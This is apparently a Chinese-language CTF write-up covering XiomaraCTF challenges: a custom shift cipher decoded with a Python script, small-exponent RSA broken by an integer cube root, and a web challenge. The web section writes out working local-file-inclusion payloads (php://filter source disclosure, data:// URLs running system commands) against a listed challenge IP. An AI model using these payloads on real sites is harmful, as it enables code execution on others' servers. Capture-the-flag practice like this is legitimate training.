---
title: XiomaraCTF 解題
tags: CTF, 解題, 筆記
---

HackMD網址：https://hackmd.io/s/B1grPrzOf

有些水題就不寫writeup了，交給其他人吧 (´・ω・`)

# Crypto - Custom HEN

密文：
```
082_336_88_167755403
```

題目跟你說，密文的產生方式是：
```
# encryption
FLAG -> HEN_Cipher -> alphametic puzzle -> CipherText
```

所以我們只要逆向這個加密過程就好了：
```
# decryption
FLAG <- HEN_Cipher <- alphametic puzzle <- CipherText
```


先用 [alphametic puzzle solver](http://www.tkcs-collins.com/truman/alphamet/alpha_solve.shtml) 把每個數字代表的英文找出來：

![](https://i.imgur.com/I8IEJtQ.png)

得到：
![](https://i.imgur.com/aII59cu.png)

將密文替換：
```
082_336_88_167755403 = CZF_KKU_ZZ_GUYYPPNCK
```


:::danger
HEN的加密模式：
左移偏移量 = ((字母的位置) * (字串總長度)) mod 26
注意！字串總長度不包含底線！
:::

:::success
HEN的解密方法：
右移偏移量 = ((字母的位置) * (字串總長度)) mod 26
不過首先要解決的就是 'A' 往右偏移1位如何到 'Z'
:::

這邊我寫了 python script 作解密，分別算出每個字母的偏移量與明文。

字母左移的部份我採用 ASCII 來作減法運算。

```python=
#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
# Copyright © 2018 howpwn <finn79426@gmail.com>


Ciphertext = 'CZFKKUZZGUYYPPNCK' # remove the "_"

plaintext_size = len(Ciphertext)

left_move = []
plaintext = ""

print "Ciphertext: {0}".format(Ciphertext)

print "Each alphabet left shift is:"
for i in range(0, plaintext_size):
    left_move.append(((i+1) * plaintext_size) % 26)
    print "alphabet[{0}] need {1} step".format(i+1, left_move[i])
print "----------"

print "Counting the left shift alphabet is what..."
for i in range(0, plaintext_size):
    temp = ord(Ciphertext[i]) + left_move[i]
    if temp > 90: # 如果 temp 大於 ASCII 的 "Z"，我們就必須將它檢掉 26 讓它回到 A 開始繼續往右移
        temp -= 26
    plaintext += chr(temp)
    print plaintext
print "----------"
```

(PS:這樣code好亂Orz...我應該用function去實作的...)

執行完腳本後會得到 "THEARSOFDIDUCTION"，這個時候把底線與FLAG頭加上去就是正確答案了。

xiomara{THE\_ARS\_OF_DIDUCTION}

---

# Crypto - Giveaway

可以秒解。


1. N 太大，factordb不能分解出p、q
2. e 很小

```python=
#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
# Copyright © 2018 howpwn <finn79426@gmail.com>

from libnum import n2s
from gmpy2 import iroot
e = 3
n = 481198641867289038243532927701020249905433964052522187774270437592775342143784702291483427578470414194602731404343532513840453569385856109993166637836189117235549985093499643724363002153995995953731212190003813128852867940536928597102669895224512199695772684398151784349020282852823384810308548307944122748283
c = 2039130155866184490894181588949291569587424373754875837330412835527276040280846677481047284126316137541961805207979583672570357348995401556991229785828117383170279052532972654304372432603436204862621797


m = iroot(c,e)
print n2s(m[0])
```

由於e太小、N太大，導致於：
c = $m^{e}$ mod n 
&nbsp;&nbsp;&nbsp;= $m^{e}$

也就是說，如果要解密m
m = $\sqrt[e] {c}$

xiomara{4y3_4y3_cryp70_6uy!}


# Web - Flag Locker

這網站有LFI漏洞

可以用 php://filter 看到該網頁的源碼 (記得base64 decode)

```
http://103.5.112.91:1234/?locker=php://filter/convert.base64-encode/resource=why
```
不過依然找不到 FLAG，所以我們必須要能夠 RCE 才能找出FLAG：

```
http://103.5.112.91:1234/?locker=data://text/plain,<?php system("ls -al")?>;
```

最後，其實FLAG是在 index.php 裡面
```
http://103.5.112.91:1234/?locker=data://text/plain,<?php system("cat index.php")?>;
```

xiomara{s0metim3s_fl@g_c@n_b3_d3cl@red_@s_v@riable}

---
